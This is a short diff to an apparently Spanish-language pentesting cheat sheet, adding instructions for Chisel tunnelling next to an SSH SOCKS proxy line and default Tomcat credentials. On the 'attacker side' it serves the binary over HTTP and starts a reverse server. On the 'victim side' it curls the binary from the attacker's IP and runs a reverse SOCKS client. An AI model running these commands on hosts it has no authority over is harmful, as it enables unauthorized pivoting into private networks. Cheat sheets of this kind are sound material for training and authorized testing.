@@ -105,6 +105,19 @@ admin:tomcat
 ```shell
 - ssh -D <puerto local que actuará como proxy> <usuario>@<ip> 
 ```
+### Uso e instalación Chisel
+#### Lado atacante
+```shell
+- python3 -m http.server 80 <--- para descargar chisel de lado de la victima.
+- chmod +x chisel_linux_amd64
+- ./chisel_linux_amd64 --reverse -p <puerto> 
+```
+#### Lado víctima
+```shell
+- curl http://<ip>/chisel_linux_amd64 -o chisel <--- para descargar chisel en la victima con el servidor del atacante.
+- chmod +x chisel
+- ./chisel client <ip>:<ip> R:socks 
+```
 <div align="left">
   <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/linux/linux-original.svg" height="39" alt="linux logo"  />
 </div>
